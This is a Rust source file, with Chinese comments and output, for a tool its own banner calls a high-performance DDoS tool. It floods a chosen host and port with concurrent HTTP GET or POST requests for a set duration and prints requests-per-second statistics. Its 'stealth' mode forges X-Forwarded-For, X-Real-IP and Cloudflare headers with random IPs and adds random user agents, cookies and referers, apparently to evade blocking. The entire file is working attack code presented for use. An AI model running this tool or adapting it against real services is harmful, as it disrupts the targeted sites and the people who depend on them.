use crate::stats::{Stats, StatsArc};
use indicatif::{ProgressBar, ProgressStyle};
use reqwest::{Client, Method};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;

pub struct AttackConfig {
    pub target: String,
    pub port: u16,
    pub connections: usize,
    pub duration: u64,
    pub https: bool,
    pub method: String,
    pub post_data: Option<String>,
    pub user_agent: Option<String>,
    pub mode: String,
}

pub async fn run_attack(config: AttackConfig) {
    println!("🚀 高性能DDoS工具启动");
    println!("目标: {}:{}", config.target, config.port);
    println!("HTTP方法: {}", config.method);
    println!("攻击模式: {}", config.mode);
    println!("并发连接: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("协议: {}", if config.https { "HTTPS" } else { "HTTP" });
    if let Some(ref data) = config.post_data {
        println!("POST数据: {}", data);
    }
    println!();

    // 根据攻击模式调整并发数
    let adjusted_connections = adjust_connections_by_mode(config.connections, &config.mode);
    let (min_delay, max_delay) = get_delay_by_mode(&config.mode);
    
    let stats = StatsArc::default();
    let client = Client::builder()
        .pool_max_idle_per_host(1000)
        .pool_idle_timeout(Duration::from_secs(30))
        .timeout(Duration::from_secs(30))
        .tcp_keepalive(Some(Duration::from_secs(30)))
        .build()
        .expect("无法创建HTTP客户端");

    let protocol = if config.https { "https" } else { "http" };
    let target_url = format!("{}://{}:{}", protocol, config.target, config.port);

    let progress_bar = ProgressBar::new(config.duration);
    progress_bar.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len} ({eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    let start_time = Instant::now();
    let stats_clone = stats.clone();
    let mut tasks = Vec::new();
    
    for _ in 0..adjusted_connections {
        let client_clone = client.clone();
        let url_clone = target_url.clone();
        let stats_clone = stats_clone.clone();
        let method = config.method.clone();
        let post_data = config.post_data.clone();
        let user_agent = config.user_agent.clone();
        let mode = config.mode.clone();
        let target_host = config.target.clone();
        let target_port = config.port;
        let is_https = config.https;
        
        let task = tokio::spawn(async move {
            loop {
                let request_start = Instant::now();
                
                // 构建请求
                let mut request_builder = match method.as_str() {
                    "POST" => {
                        let mut req = client_clone.post(&url_clone);
                        if let Some(ref data) = post_data {
                            req = req.body(data.clone());
                        }
                        req
                    }
                    _ => client_clone.get(&url_clone)
                };

                // 添加随机或自定义User-Agent
                let ua = if let Some(ref ua) = user_agent {
                    ua.as_str()
                } else {
                    get_random_user_agent()
                };
                request_builder = request_builder.header("User-Agent", ua);

                // 添加其他请求头
                request_builder = request_builder
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
                    .header("Accept-Language", get_random_accept_language())
                    .header("Accept-Encoding", "gzip, deflate")
                    .header("Connection", "keep-alive")
                    .header("Upgrade-Insecure-Requests", "1")
                    .header("Cache-Control", "no-cache")
                    .header("Pragma", "no-cache")
                    .header("DNT", "1")
                    .header("Sec-Fetch-Dest", "document")
                    .header("Sec-Fetch-Mode", "navigate")
                    .header("Sec-Fetch-Site", "none")
                    .header("Sec-Fetch-User", "?1");

                // 根据模式添加额外的伪装头
                if mode == "stealth" {
                    request_builder = request_builder
                        .header("Referer", get_random_referer())
                        .header("X-Forwarded-For", generate_random_ip())
                        .header("X-Real-IP", generate_random_ip())
                        .header("X-Forwarded-Proto", if is_https { "https" } else { "http" })
                        .header("X-Forwarded-Host", &target_host)
                        .header("X-Forwarded-Port", target_port.to_string())
                        .header("CF-Connecting-IP", generate_random_ip())
                        .header("CF-IPCountry", get_random_country_code())
                        .header("CF-Visitor", "{\"scheme\":\"https\"}")
                        .header("CF-Ray", generate_random_cf_ray())
                        .header("CF-Device-Type", get_random_device_type())
                        .header("Cookie", generate_random_cookies())
                        .header("Origin", get_random_origin())
                        .header("Sec-Ch-Ua", get_random_sec_ch_ua())
                        .header("Sec-Ch-Ua-Mobile", "?0")
                        .header("Sec-Ch-Ua-Platform", get_random_platform());
                }

                match request_builder.send().await {
                    Ok(response) => {
                        let success = response.status().is_success();
                        let status_code = response.status().as_u16();
                        let sent_bytes = url_clone.len() as u64 + 200 + post_data.as_ref().map_or(0, |d| d.len() as u64);
                        let received_bytes = response.content_length().unwrap_or(0);
                        {
                            let mut stats = stats_clone.lock().unwrap();
                            stats.add_request(success, sent_bytes, received_bytes);
                        }
                        if !success {
                            eprintln!("请求失败: HTTP {}", status_code);
                        }
                    }
                    Err(e) => {
                        {
                            let mut stats = stats_clone.lock().unwrap();
                            stats.add_request(false, url_clone.len() as u64 + 200, 0);
                        }
                        eprintln!("连接错误: {}", e);
                    }
                }
                
                // 根据模式调整延迟
                let elapsed = request_start.elapsed();
                if elapsed < Duration::from_millis(10) {
                    let random_delay = rand::thread_rng().gen_range(min_delay..max_delay);
                    sleep(Duration::from_millis(random_delay)).await;
                }
            }
        });
        tasks.push(task);
    }

    // 实时统计监控任务
    let stats_monitor = stats.clone();
    let monitor_task = tokio::spawn(async move {
        let mut last_stats = crate::stats::Stats::default();
        let mut last_time = Instant::now();
        loop {
            sleep(Duration::from_secs(1)).await;
            let current_stats = stats_monitor.lock().unwrap();
            let current_time = Instant::now();
            let time_diff = current_time.duration_since(last_time).as_secs_f64();
            let requests_diff = current_stats.total_requests - last_stats.total_requests;
            let rps = requests_diff as f64 / time_diff;
            println!("\r📊 RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                rps, 
                current_stats.successful_requests, 
                current_stats.failed_requests, 
                current_stats.total_requests
            );
            last_stats = current_stats.clone();
            last_time = current_time;
        }
    });

    // 监控进度
    let progress_task = tokio::spawn(async move {
        let mut elapsed = 0u64;
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            progress_bar.inc(1);
        }
        progress_bar.finish_with_message("攻击完成！");
    });

    // 等待攻击完成
    tokio::select! {
        _ = progress_task => {
            println!("\n✅ 攻击完成！");
        }
    }

    // 取消所有正在运行的任务
    for task in tasks {
        task.abort();
    }
    monitor_task.abort();

    // 显示最终统计信息
    let final_stats = stats.lock().unwrap();
    let elapsed = start_time.elapsed();
    let total_rps = final_stats.total_requests as f64 / elapsed.as_secs_f64();
    println!("\n📊 最终攻击统计:");
    println!("总运行时间: {:.2}秒", elapsed.as_secs_f64());
    println!("目标: {}:{}", config.target, config.port);
    println!("并发连接数: {}", config.connections);
    println!("总请求数: {}", final_stats.total_requests);
    println!("成功请求: {}", final_stats.successful_requests);
    println!("失败请求: {}", final_stats.failed_requests);
    println!("平均RPS: {:.0}", total_rps);
    println!("发送字节: {} MB", final_stats.bytes_sent / 1024 / 1024);
    println!("接收字节: {} MB", final_stats.bytes_received / 1024 / 1024);
    println!("成功率: {:.1}%", 
        (final_stats.successful_requests as f64 / final_stats.total_requests as f64) * 100.0
    );
}

// 生成随机的User-Agent
fn get_random_user_agent() -> &'static str {
    let user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.55",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.3; Trident/7.0)",
    ];
    user_agents[rand::thread_rng().gen_range(0..user_agents.len())]
}

// 生成随机Referer
fn get_random_referer() -> &'static str {
    let referers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://www.baidu.com/",
        "https://www.facebook.com/",
        "https://www.twitter.com/",
        "https://www.linkedin.com/",
        "https://www.youtube.com/",
        "https://www.reddit.com/",
        "https://www.stackoverflow.com/",
        "https://www.github.com/",
        "https://www.amazon.com/",
        "https://www.ebay.com/",
        "https://www.wikipedia.org/",
        "https://www.medium.com/",
    ];
    referers[rand::thread_rng().gen_range(0..referers.len())]
}

// 生成随机Accept-Language
fn get_random_accept_language() -> &'static str {
    let languages = [
        "zh-CN,zh;q=0.9,en;q=0.8",
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "zh-TW,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "ko-KR,ko;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
        "it-IT,it;q=0.9,en;q=0.8",
    ];
    languages[rand::thread_rng().gen_range(0..languages.len())]
}

// 生成随机IP地址
fn generate_random_ip() -> String {
    let mut rng = rand::thread_rng();
    format!("{}.{}.{}.{}", 
        rng.gen_range(1..255),
        rng.gen_range(0..256),
        rng.gen_range(0..256),
        rng.gen_range(1..255)
    )
}

// 根据攻击模式调整延迟
fn get_delay_by_mode(mode: &str) -> (u64, u64) {
    match mode.to_lowercase().as_str() {
        "stealth" => (100, 500),    // 隐蔽模式：100-500ms
        "normal" => (50, 150),       // 正常模式：50-150ms
        "aggressive" => (10, 50),    // 激进模式：10-50ms
        _ => (50, 150),
    }
}

// 根据攻击模式调整并发数
fn adjust_connections_by_mode(base_connections: usize, mode: &str) -> usize {
    match mode.to_lowercase().as_str() {
        "stealth" => (base_connections as f64 * 0.5) as usize,  // 减少50%
        "normal" => base_connections,
        "aggressive" => (base_connections as f64 * 2.0) as usize, // 增加100%
        _ => base_connections,
    }
}

// 生成随机Cookie
fn generate_random_cookies() -> String {
    let mut rng = rand::thread_rng();
    let cookies = [
        "session_id=abc123; path=/",
        "user_id=12345; path=/",
        "theme=dark; path=/",
        "language=zh-CN; path=/",
        "timezone=Asia/Shanghai; path=/",
        "preferences=default; path=/",
        "analytics=1; path=/",
        "marketing=1; path=/",
        "gdpr=1; path=/",
        "consent=all; path=/",
    ];
    let cookie = cookies[rng.gen_range(0..cookies.len())];
    format!("{}; _ga=GA1.2.{}.{}; _gid=GA1.2.{}.{}", 
        cookie,
        rng.gen_range(1000000000i64..9999999999i64),
        rng.gen_range(1000000000i64..9999999999i64),
        rng.gen_range(1000000000i64..9999999999i64),
        rng.gen_range(1000000000i64..9999999999i64)
    )
}

// 生成随机Origin
fn get_random_origin() -> &'static str {
    let origins = [
        "https://www.google.com",
        "https://www.bing.com",
        "https://www.yahoo.com",
        "https://www.facebook.com",
        "https://www.twitter.com",
        "https://www.linkedin.com",
        "https://www.youtube.com",
        "https://www.reddit.com",
        "https://www.stackoverflow.com",
        "https://www.github.com",
        "https://www.amazon.com",
        "https://www.ebay.com",
        "https://www.wikipedia.org",
        "https://www.medium.com",
        "https://www.quora.com",
    ];
    origins[rand::thread_rng().gen_range(0..origins.len())]
}

// 生成随机Sec-Ch-Ua
fn get_random_sec_ch_ua() -> &'static str {
    let sec_ch_ua = [
        "\"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\", \";Not A Brand\";v=\"99\"",
        "\"Google Chrome\";v=\"92\", \"Chromium\";v=\"92\", \";Not A Brand\";v=\"99\"",
        "\"Google Chrome\";v=\"93\", \"Chromium\";v=\"93\", \";Not A Brand\";v=\"99\"",
        "\"Microsoft Edge\";v=\"91\", \"Chromium\";v=\"91\", \";Not A Brand\";v=\"99\"",
        "\"Microsoft Edge\";v=\"92\", \"Chromium\";v=\"92\", \";Not A Brand\";v=\"99\"",
        "\"Firefox\";v=\"89\"",
        "\"Firefox\";v=\"90\"",
        "\"Safari\";v=\"14\"",
        "\"Safari\";v=\"15\"",
    ];
    sec_ch_ua[rand::thread_rng().gen_range(0..sec_ch_ua.len())]
}

// 生成随机平台
fn get_random_platform() -> &'static str {
    let platforms = [
        "\"Windows\"",
        "\"macOS\"",
        "\"Linux\"",
        "\"Android\"",
        "\"iOS\"",
    ];
    platforms[rand::thread_rng().gen_range(0..platforms.len())]
}

// 生成随机国家代码
fn get_random_country_code() -> &'static str {
    let countries = [
        "US", "CN", "JP", "DE", "GB", "FR", "CA", "AU", "BR", "IN",
        "RU", "KR", "IT", "ES", "NL", "SE", "CH", "NO", "DK", "FI",
    ];
    countries[rand::thread_rng().gen_range(0..countries.len())]
}

// 生成随机CF-Ray
fn generate_random_cf_ray() -> String {
    let mut rng = rand::thread_rng();
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
    let ray_id: String = (0..16).map(|_| chars[rng.gen_range(0..chars.len())]).collect();
    format!("{}-{}", ray_id, get_random_country_code())
}

// 生成随机设备类型
fn get_random_device_type() -> &'static str {
    let device_types = [
        "desktop",
        "mobile",
        "tablet",
    ];
    device_types[rand::thread_rng().gen_range(0..device_types.len())]
} 